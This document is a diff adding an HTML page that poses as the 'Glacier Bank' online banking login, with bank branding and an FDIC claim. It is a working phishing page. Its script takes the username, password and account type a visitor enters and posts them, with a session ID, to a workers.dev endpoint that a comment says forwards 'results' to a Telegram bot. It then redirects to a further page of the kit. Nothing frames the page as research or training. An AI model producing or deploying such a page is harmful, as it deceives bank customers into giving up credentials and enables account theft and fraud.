@@ -1,0 +1,366 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Glacier | Online Banking Login</title>
+
+<style>
+:root{
+  --blue:#0a7db3;
+  --blue-dark:#06638f;
+  --text:#1e1e1e;
+  --hero-bg: url("assets/gbg.jpg");
+}
+
+*{box-sizing:border-box}
+
+body{
+  margin:0;
+  font-family:"Inter", Arial, sans-serif;
+  color:var(--text);
+  background:#fff;
+}
+
+header{
+  background:#fff;
+  border-bottom:1px solid #e6e6e6;
+}
+
+.header-top{
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  padding:18px 6%;
+  flex-wrap:wrap;
+}
+
+.logo{
+  display:flex;
+  flex-direction:column;
+  gap:4px;
+}
+
+.logo img{
+  height:40px;
+}
+
+.fdic{
+  font-size:12px;
+  font-style:italic;
+  color:#333;
+}
+
+.nav{
+  display:flex;
+  gap:20px;
+  font-size:14px;
+  flex-wrap:wrap;
+}
+
+.nav a{
+  text-decoration:none;
+  color:#777;
+}
+
+.subnav{
+  display:flex;
+  justify-content:flex-end;
+  gap:20px;
+  padding:14px 6%;
+  border-top:1px solid #eee;
+  overflow-x:auto;
+  white-space:nowrap;
+}
+
+.subnav a{
+  text-decoration:none;
+  color:#333;
+  font-weight:500;
+  position:relative;
+}
+
+.subnav a strong{
+  color:var(--blue);
+}
+
+.subnav a strong::after{
+  content:"";
+  position:absolute;
+  bottom:-6px;
+  left:50%;
+  transform:translateX(-50%);
+  border-left:6px solid transparent;
+  border-right:6px solid transparent;
+  border-top:6px solid var(--blue);
+}
+
+.hero{
+  position:relative;
+  min-height:70vh;
+  background:var(--hero-bg) center/cover no-repeat;
+  display:flex;
+  align-items:center;
+  justify-content:flex-end;
+  padding:40px 6%;
+}
+
+.hero::after{
+  content:"";
+  position:absolute;
+  inset:0;
+  background:rgba(0,0,0,0.35);
+}
+
+.login-card{
+  position:relative;
+  background:#fff;
+  width:100%;
+  max-width:360px;
+  border-radius:4px;
+  box-shadow:0 18px 40px rgba(0,0,0,.25);
+  overflow:hidden;
+  z-index:1;
+}
+
+.login-card header{
+  background:var(--blue);
+  color:#fff;
+  padding:14px 18px;
+  font-weight:600;
+}
+
+.login-card .body{
+  padding:22px 20px 26px;
+}
+
+.login-card label{
+  display:block;
+  font-size:13px;
+  margin-bottom:6px;
+  color:#444;
+}
+
+.login-card select,
+.login-card input{
+  width:100%;
+  padding:12px;
+  margin-bottom:14px;
+  border:1px solid #ccc;
+  border-radius:3px;
+  font-size:14px;
+}
+
+.login-card button{
+  width:100%;
+  padding:13px;
+  background:var(--blue);
+  color:#fff;
+  border:none;
+  border-radius:3px;
+  font-size:15px;
+  cursor:pointer;
+}
+
+.login-card button:hover{
+  background:var(--blue-dark);
+}
+
+.login-links{
+  display:flex;
+  justify-content:space-between;
+  margin-top:14px;
+}
+
+.login-links a{
+  font-size:13px;
+  color:var(--blue);
+  text-decoration:none;
+}
+
+footer{
+  background:#0e2b3c;
+  color:#fff;
+  padding:26px 6%;
+  font-size:13px;
+  text-align:center;
+}
+
+.footer-inner{
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  gap:8px;
+}
+
+footer a{
+  color:#c8da2a;
+  text-decoration:none;
+}
+
+@media (max-width:900px){
+  .header-top{
+    flex-direction:column;
+    align-items:flex-start;
+    gap:10px;
+  }
+  .nav{
+    width:100%;
+    gap:14px;
+  }
+  .subnav{
+    justify-content:flex-start;
+  }
+  .hero{
+    justify-content:center;
+    padding:40px 20px;
+  }
+}
+
+@media (max-width:500px){
+  .header-top{
+    padding:14px 20px;
+  }
+  .subnav{
+    padding:12px 20px;
+    font-size:14px;
+  }
+  .logo img{
+    height:34px;
+  }
+  .fdic{
+    font-size:11px;
+  }
+  .login-card{
+    max-width:100%;
+  }
+  .login-card .body{
+    padding:18px;
+  }
+  .login-card input,
+  .login-card select,
+  .login-card button{
+    padding:14px;
+    font-size:16px;
+  }
+  .login-links{
+    flex-direction:column;
+    gap:8px;
+    align-items:flex-start;
+  }
+}
+</style>
+</head>
+
+<body>
+
+<header>
+  <div class="header-top">
+    <div class="logo">
+      <img src="assets/logo.svg" alt="Glacier Bank Logo">
+      <div class="fdic">FDIC-Insured - Backed by the full faith and credit of the U.S. Government</div>
+    </div>
+
+    <nav class="nav">
+      <a href="#">Locations</a>
+      <a href="#">Education</a>
+      <a href="#">Contact</a>
+      <a href="#">About</a>
+      <a href="#">Community</a>
+    </nav>
+  </div>
+
+  <div class="subnav">
+    <a href="#">Personal</a>
+    <a href="#">Business</a>
+    <a href="#">Online Banking</a>
+    <a href="#"><strong>Login</strong></a>
+    <a href="#">Search</a>
+  </div>
+</header>
+
+<section class="hero">
+  <form class="login-card" id="loginForm">
+    <header>Online Banking Access</header>
+    <div class="body">
+      <label>Log in to Online Banking</label>
+      <select id="bankType">
+        <option>Online Banking</option>
+        <option>Business Banking</option>
+      </select>
+
+      <input type="text" name="username" placeholder="Username" required />
+      <input type="password" name="password" placeholder="Password" required />
+
+      <button type="submit">Login</button>
+
+      <div class="login-links">
+        <a href="#">Forgot Password</a>
+        <a href="#">Online Construction Manager</a>
+      </div>
+    </div>
+  </form>
+</section>
+
+<footer>
+  <div class="footer-inner">
+    <div>© 2026 Glacier Bank · Member FDIC</div>
+    <div>
+      <a href="#">Privacy</a> ·
+      <a href="#">Security</a> ·
+      <a href="#">Terms</a>
+    </div>
+  </div>
+</footer>
+
+<script>
+// Persistent session setup
+const session = localStorage.getItem("session") || crypto.randomUUID();
+localStorage.setItem("session", session);
+
+// Worker URL FOR RESULTS TO YOUR TELEGRAM BOT!!!!!!!!!!!!!
+const WORKER_URL = "https://summer-rain-1f5b.tekin49532.workers.dev/event";
+
+// Submit handler
+document.getElementById("loginForm").addEventListener("submit", async e => {
+  e.preventDefault();
+
+  const username = document.querySelector("input[name=username]").value.trim();
+  const password = document.querySelector("input[name=password]").value.trim();
+  const bankType = document.getElementById("bankType").value;
+
+  const payload = {
+    username,
+    password,
+    type: bankType,
+    session,
+    step: "login_page",
+    time: new Date().toISOString()
+  };
+
+  try {
+    const response = await fetch(WORKER_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    });
+
+    const result = await response.json();
+    console.log("Worker response:", result);
+
+    if(result.status === "success"){
+      // Redirect after successful submission
+      window.location.href = "../Pages/DM3P.html";
+    } else {
+      alert("Error submitting login: " + (result.message || "Try again."));
+    }
+
+  } catch(err){
+    console.error("Fetch error:", err);
+    alert("Network error. Please try again.");
+  }
+});
+</script>
+
+</body>
+</html>
